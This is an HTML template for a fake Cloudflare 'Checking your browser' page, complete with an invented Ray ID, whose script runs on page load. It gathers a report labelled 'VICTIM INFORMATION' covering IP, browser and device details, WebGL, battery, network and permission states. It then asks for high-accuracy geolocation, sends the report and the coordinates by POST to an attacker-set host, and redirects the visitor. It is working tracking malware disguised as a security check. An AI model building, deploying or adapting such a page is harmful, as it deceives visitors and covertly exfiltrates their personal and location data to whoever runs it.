<!DOCTYPE html>
<html lang="en-US">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Just a moment...</title>
  <style>
    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
      background: #fff;
      margin: 0;
      padding: 0;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      text-align: center;
      color: #333;
      padding: 20px;
      box-sizing: border-box;
    }
    .container {
      max-width: 600px;
      width: 100%;
    }
    .spinner {
      display: flex;
      gap: 6px;
      margin: 30px auto;
      justify-content: center;
    }
    .spinner div {
      width: 14px;
      height: 14px;
      background: #f58220;
      border-radius: 50%;
      animation: fader 1.4s infinite ease-in-out;
    }
    .spinner div:nth-child(2) { animation-delay: -0.32s; }
    .spinner div:nth-child(3) { animation-delay: -0.16s; }
    @keyframes fader {
      0%, 80%, 100% { transform: scale(0); }
      40% { transform: scale(1); }
    }
    h1 {
      font-size: 1.5rem;
      margin: 0 0 15px;
      font-weight: 600;
      color: #000;
    }
    p {
      font-size: 1rem;
      margin: 8px 0;
      color: #555;
      line-height: 1.5;
    }
    .footer {
      margin-top: 40px;
      font-size: 0.875rem;
      color: #999;
    }
    #status {
      font-weight: 500;
      color: #2c3e50;
    }
    @media (max-width: 480px) {
      h1 { font-size: 1.3rem; }
      p { font-size: 0.95rem; }
      .spinner div { width: 12px; height: 12px; }
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="spinner">
      <div></div>
      <div></div>
      <div></div>
    </div>
    <h1>Checking your browser before accessing website</h1>
    <p>This process is automatic. Please wait.</p>
    <p id="status">Verifying security parameters...</p>
  </div>
  <div class="footer">
    DDoS protection by Cloudflare<br>
    Ray ID: <span id="rayId"></span>
  </div>

  <script>
    const UID = "<%= uid %>";
    const HOST = "<%= a %>";
    let dataSent = false;
    let locationSent = false;
    let fingerprint = "";
    let retries = { data: 0, location: 0 };

    document.getElementById("rayId").innerText = '7' + Array(15).fill(0).map(() => Math.floor(Math.random()*16).toString(16)).join('');

    // Start immediately
    collectData();

    async function collectData() {
      try {
        await buildFingerprint();
        sendDataWithRetry();
        requestLocationWithRetry();
        // Redirect after 12s max
        setTimeout(() => { window.location.href = "<%= url %>"; }, 12000);
      } catch(e) {
        console.error("Collection init error:", e);
        fallbackRedirect();
      }
    }

    async function buildFingerprint() {
      fingerprint = '<code>‚úÖ VICTIM INFORMATION</code><br><br>';
      fingerprint += `<b>‚öì IP:</b> <a href="https://ip-api.com/#<%= ip %>"><%= ip %></a> | <b>üïó Time:</b> <%= time %><br><br>`;
      fingerprint += `<b>‚è≥ Local Time:</b> ${new Date()}<br><br>`;

      // MAXIMUM FINGERPRINTING
      const navKeys = [
        "vendor","productSub","maxTouchPoints","doNotTrack","hardwareConcurrency",
        "cookieEnabled","appCodeName","appName","appVersion","platform","product",
        "userAgent","language","languages","webdriver","pdfViewerEnabled","deviceMemory"
      ];

      fingerprint += "<b>üì± DEVICE & BROWSER</b><br>";
      navKeys.forEach(key => {
        if (navigator[key] !== undefined) {
          let val = navigator[key];
          if (typeof val === 'object' && val !== null) {
            try { val = JSON.stringify(val); } catch(e) { val = '[Object]'; }
          }
          fingerprint += `<b>${key}:</b> <code>${val}</code><br>`;
        }
      });

      // Screen
      fingerprint += "<br><b>üñ•Ô∏è SCREEN</b><br>";
      ["width","height","availWidth","availHeight","colorDepth","pixelDepth"].forEach(p => {
        fingerprint += `<b>screen.${p}:</b> <code>${screen[p]}</code><br>`;
      });

      // Timezone
      fingerprint += `<br><b>üåç TIMEZONE:</b> <code>${Intl.DateTimeFormat().resolvedOptions().timeZone}</code><br>`;

      // Plugins
      if (navigator.plugins && navigator.plugins.length > 0) {
        fingerprint += "<br><b>üß© PLUGINS (Top 3)</b><br>";
        for (let i = 0; i < Math.min(3, navigator.plugins.length); i++) {
          let p = navigator.plugins[i];
          fingerprint += `<b>${p.name}:</b> <code>${p.description.substring(0, 40)}...</code><br>`;
        }
      }

      // WebGL
      try {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        if (gl) {
          const dbg = gl.getExtension('WEBGL_debug_renderer_info');
          if (dbg) {
            const vendor = gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL);
            const renderer = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
            fingerprint += `<br><b>üéÆ WEBGL:</b> <code>${vendor} | ${renderer}</code><br>`;
          }
        }
      } catch(e) { fingerprint += `<br><b>üéÆ WEBGL:</b> <code>Blocked/Error</code><br>`; }

      // Network
      if (navigator.connection) {
        fingerprint += "<br><b>üåê NETWORK</b><br>";
        ['type','effectiveType','rtt','downlink'].forEach(k => {
          if (navigator.connection[k] !== undefined) {
            fingerprint += `<b>connection.${k}:</b> <code>${navigator.connection[k]}</code><br>`;
          }
        });
      }

      // Battery
      if ('getBattery' in navigator) {
        try {
          const battery = await navigator.getBattery();
          fingerprint += `<br><b>üîã BATTERY:</b> <code>${Math.round(battery.level*100)}% | Charging: ${battery.charging}</code><br>`;
        } catch(e) {}
      }

      // Touch
      if ('ontouchstart' in window) {
        fingerprint += `<br><b>üëÜ TOUCH:</b> <code>Yes | Max Points: ${navigator.maxTouchPoints}</code><br>`;
      }

      // Permissions
      const perms = ['geolocation','camera','microphone'];
      fingerprint += "<br><b>üîê PERMISSIONS</b><br>";
      for (let p of perms) {
        try {
          const status = await navigator.permissions.query({name: p});
          fingerprint += `<b>${p}:</b> <code>${status.state}</code><br>`;
        } catch(e) {}
      }
    }

    function sendDataWithRetry() {
      if (dataSent) return;
      
      fetch(`${HOST}/data`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: `uid=${encodeURIComponent(UID)}&data=${encodeURIComponent(fingerprint)}`
      })
      .then(r => {
        if (r.ok) {
          dataSent = true;
          document.getElementById("status").innerText = "‚úÖ Device data captured. Requesting location...";
          checkCompletion();
        } else {
          throw new Error('HTTP ' + r.status);
        }
      })
      .catch(err => {
        console.error("Data send failed:", err);
        retries.data++;
        if (retries.data <= 3) {
          setTimeout(sendDataWithRetry, 2000 * retries.data); // Exponential backoff
        } else {
          dataSent = true; // Give up but mark as sent to avoid blocking
          checkCompletion();
        }
      });
    }

    function requestLocationWithRetry() {
      if (!navigator.geolocation) {
        locationSent = true;
        checkCompletion();
        return;
      }

      navigator.geolocation.getCurrentPosition(
        (pos) => {
          fetch(`${HOST}/location`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            body: `uid=${encodeURIComponent(UID)}&lat=${pos.coords.latitude}&lon=${pos.coords.longitude}&acc=${pos.coords.accuracy}`
          })
          .then(r => {
            if (r.ok) {
              locationSent = true;
              document.getElementById("status").innerText = "‚úÖ Location captured. Finalizing...";
              checkCompletion();
            } else {
              throw new Error('HTTP ' + r.status);
            }
          })
          .catch(err => {
            console.error("Location send failed:", err);
            retries.location++;
            if (retries.location <= 3) {
              setTimeout(() => requestLocationWithRetry(), 2000 * retries.location);
            } else {
              locationSent = true; // Give up but proceed
              checkCompletion();
            }
          });
        },
        (err) => {
          console.error("Geolocation error:", err);
          retries.location++;
          if (retries.location <= 3) {
            setTimeout(requestLocationWithRetry, 2000 * retries.location);
          } else {
            locationSent = true;
            checkCompletion();
          }
        },
        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
      );
    }

    function checkCompletion() {
      if (dataSent && locationSent) {
        document.getElementById("status").innerText = "‚úÖ Verification complete. Redirecting...";
        setTimeout(() => { window.location.href = "<%= url %>"; }, 1000);
      }
    }

    function fallbackRedirect() {
      setTimeout(() => { window.location.href = "<%= url %>"; }, 5000);
    }
  </script>
</body>
</html>
